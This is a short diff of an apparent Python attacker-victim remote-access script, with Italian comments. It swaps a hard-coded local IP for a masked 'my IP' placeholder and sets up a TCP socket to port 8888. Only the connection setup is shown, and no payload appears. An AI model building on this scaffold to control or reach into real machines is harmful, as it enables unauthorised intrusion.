@@ -9,7 +9,7 @@ import shlex
 
 ###### CLIENT (ATTACCANTE) DA CONNETTERE AL SERVER (VITTIMA) ######
 
-chost = '192.168.1.119'
+chost = '192.168.xxx.xxx' # IP mio
 cport = 8888
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
